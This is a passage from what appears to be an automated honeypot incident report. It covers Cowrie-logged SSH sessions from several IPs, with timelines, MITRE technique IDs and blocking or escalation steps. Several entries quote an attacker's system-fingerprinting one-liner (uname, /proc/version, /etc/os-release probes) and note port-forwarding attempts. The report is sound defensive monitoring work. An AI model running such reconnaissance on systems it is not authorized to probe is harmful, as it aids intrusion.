| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:44:02` | `cowrie.session.connect` |
| `2026-07-11 06:44:02` | `cowrie.client.version` |
| `2026-07-11 06:44:02` | `cowrie.client.kex` |
| `2026-07-11 06:44:03` | `cowrie.login.success` |
| `2026-07-11 06:44:04` | `cowrie.session.params` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.success` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:04` | `cowrie.command.input` |
| `2026-07-11 06:44:05` | `cowrie.log.closed` |
| `2026-07-11 06:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef7bda491ca6

| Field | Detail |
|---|---|
| **Source IP** | `185.65.238[.]250` |
| **First Seen** | 2026-07-11 06:44 |
| **Last Seen** | 2026-07-11 06:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:44:17` | `cowrie.session.connect` |
| `2026-07-11 06:44:17` | `cowrie.client.version` |
| `2026-07-11 06:44:17` | `cowrie.client.kex` |
| `2026-07-11 06:44:18` | `cowrie.login.success` |
| `2026-07-11 06:44:18` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.65.238[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.65.238[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab02fa31f76

| Field | Detail |
|---|---|
| **Source IP** | `112.194.142[.]167` |
| **First Seen** | 2026-07-11 06:44 |
| **Last Seen** | 2026-07-11 06:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:44:28` | `cowrie.session.connect` |
| `2026-07-11 06:44:28` | `cowrie.client.version` |
| `2026-07-11 06:44:28` | `cowrie.client.kex` |
| `2026-07-11 06:44:31` | `cowrie.login.success` |
| `2026-07-11 06:44:32` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.194.142[.]167` to AbuseIPDB if not already reported
- [ ] Block `112.194.142[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2844b6b8dbb

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-07-11 06:45 |
| **Last Seen** | 2026-07-11 06:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:45:03` | `cowrie.session.connect` |
| `2026-07-11 06:45:03` | `cowrie.client.version` |
| `2026-07-11 06:45:03` | `cowrie.client.kex` |
| `2026-07-11 06:45:05` | `cowrie.login.success` |
| `2026-07-11 06:45:06` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858253a68ed6

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-11 06:45 |
| **Last Seen** | 2026-07-11 06:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:45:11` | `cowrie.session.connect` |
| `2026-07-11 06:45:12` | `cowrie.client.version` |
| `2026-07-11 06:45:12` | `cowrie.client.kex` |
| `2026-07-11 06:45:13` | `cowrie.login.success` |
| `2026-07-11 06:45:13` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9d903a9365

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:45 |
| **Last Seen** | 2026-07-11 06:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:45:50` | `cowrie.session.connect` |
| `2026-07-11 06:45:50` | `cowrie.client.version` |
| `2026-07-11 06:45:50` | `cowrie.client.kex` |
| `2026-07-11 06:45:50` | `cowrie.login.success` |
| `2026-07-11 06:45:52` | `cowrie.session.params` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.success` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.command.input` |
| `2026-07-11 06:45:52` | `cowrie.log.closed` |
| `2026-07-11 06:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb300b037c09

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 06:47 |
| **Last Seen** | 2026-07-11 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:47:15` | `cowrie.session.connect` |
| `2026-07-11 06:47:15` | `cowrie.client.version` |
| `2026-07-11 06:47:16` | `cowrie.client.kex` |
| `2026-07-11 06:47:16` | `cowrie.login.success` |
| `2026-07-11 06:47:17` | `cowrie.session.params` |
| `2026-07-11 06:47:17` | `cowrie.command.input` |
| `2026-07-11 06:47:18` | `cowrie.log.closed` |
| `2026-07-11 06:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10140dc5733b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:47 |
| **Last Seen** | 2026-07-11 06:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:47:44` | `cowrie.session.connect` |
| `2026-07-11 06:47:44` | `cowrie.client.version` |
| `2026-07-11 06:47:44` | `cowrie.client.kex` |
| `2026-07-11 06:47:45` | `cowrie.login.success` |
| `2026-07-11 06:47:45` | `cowrie.session.params` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.success` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:45` | `cowrie.command.input` |
| `2026-07-11 06:47:46` | `cowrie.log.closed` |
| `2026-07-11 06:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44f70a25c1bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:49 |
| **Last Seen** | 2026-07-11 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:49:41` | `cowrie.session.connect` |
| `2026-07-11 06:49:41` | `cowrie.client.version` |
| `2026-07-11 06:49:42` | `cowrie.client.kex` |
| `2026-07-11 06:49:42` | `cowrie.login.success` |
| `2026-07-11 06:49:43` | `cowrie.session.params` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.success` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.command.input` |
| `2026-07-11 06:49:43` | `cowrie.log.closed` |
| `2026-07-11 06:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc5bfc2f153

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:51 |
| **Last Seen** | 2026-07-11 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:51:52` | `cowrie.session.connect` |
| `2026-07-11 06:51:52` | `cowrie.client.version` |
| `2026-07-11 06:51:52` | `cowrie.client.kex` |
| `2026-07-11 06:51:52` | `cowrie.login.success` |
| `2026-07-11 06:51:53` | `cowrie.session.params` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.success` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.command.input` |
| `2026-07-11 06:51:53` | `cowrie.log.closed` |
| `2026-07-11 06:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde5a9227692

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:54 |
| **Last Seen** | 2026-07-11 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:54:05` | `cowrie.session.connect` |
| `2026-07-11 06:54:05` | `cowrie.client.version` |
| `2026-07-11 06:54:05` | `cowrie.client.kex` |
| `2026-07-11 06:54:06` | `cowrie.login.success` |
| `2026-07-11 06:54:07` | `cowrie.session.params` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.success` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:07` | `cowrie.command.input` |
| `2026-07-11 06:54:08` | `cowrie.log.closed` |
| `2026-07-11 06:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68ca448103da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:55 |
| **Last Seen** | 2026-07-11 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:55:46` | `cowrie.session.connect` |
| `2026-07-11 06:55:47` | `cowrie.client.version` |
| `2026-07-11 06:55:47` | `cowrie.client.kex` |
| `2026-07-11 06:55:48` | `cowrie.login.success` |
| `2026-07-11 06:55:49` | `cowrie.session.params` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.success` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.command.input` |
| `2026-07-11 06:55:49` | `cowrie.log.closed` |
| `2026-07-11 06:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641855d9a79c

| Field | Detail |
|---|---|
| **Source IP** | `35.241.208[.]90` |
| **First Seen** | 2026-07-11 06:55 |
| **Last Seen** | 2026-07-11 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:55:54` | `cowrie.session.connect` |
| `2026-07-11 06:55:54` | `cowrie.client.version` |
| `2026-07-11 06:55:54` | `cowrie.client.kex` |
| `2026-07-11 06:55:56` | `cowrie.login.success` |
| `2026-07-11 06:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.241.208[.]90` to AbuseIPDB if not already reported
- [ ] Block `35.241.208[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c765330635ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:57 |
| **Last Seen** | 2026-07-11 06:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:57:29` | `cowrie.session.connect` |
| `2026-07-11 06:57:29` | `cowrie.client.version` |
| `2026-07-11 06:57:29` | `cowrie.client.kex` |
| `2026-07-11 06:57:30` | `cowrie.login.success` |
| `2026-07-11 06:57:31` | `cowrie.session.params` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.success` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:31` | `cowrie.command.input` |
| `2026-07-11 06:57:32` | `cowrie.log.closed` |
| `2026-07-11 06:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e5e45f833f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:59 |
| **Last Seen** | 2026-07-11 06:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:59:06` | `cowrie.session.connect` |
| `2026-07-11 06:59:06` | `cowrie.client.version` |
| `2026-07-11 06:59:06` | `cowrie.client.kex` |
| `2026-07-11 06:59:07` | `cowrie.login.success` |
| `2026-07-11 06:59:08` | `cowrie.session.params` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.success` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:08` | `cowrie.command.input` |
| `2026-07-11 06:59:09` | `cowrie.log.closed` |
| `2026-07-11 06:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56aae4dccae

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 07:00 |
| **Last Seen** | 2026-07-11 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:00:25` | `cowrie.session.connect` |
| `2026-07-11 07:00:25` | `cowrie.client.version` |
| `2026-07-11 07:00:25` | `cowrie.client.kex` |
| `2026-07-11 07:00:27` | `cowrie.login.success` |
| `2026-07-11 07:00:28` | `cowrie.session.params` |
| `2026-07-11 07:00:28` | `cowrie.command.input` |
| `2026-07-11 07:00:28` | `cowrie.log.closed` |
| `2026-07-11 07:00:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999491e078c6

| Field | Detail |
|---|---|
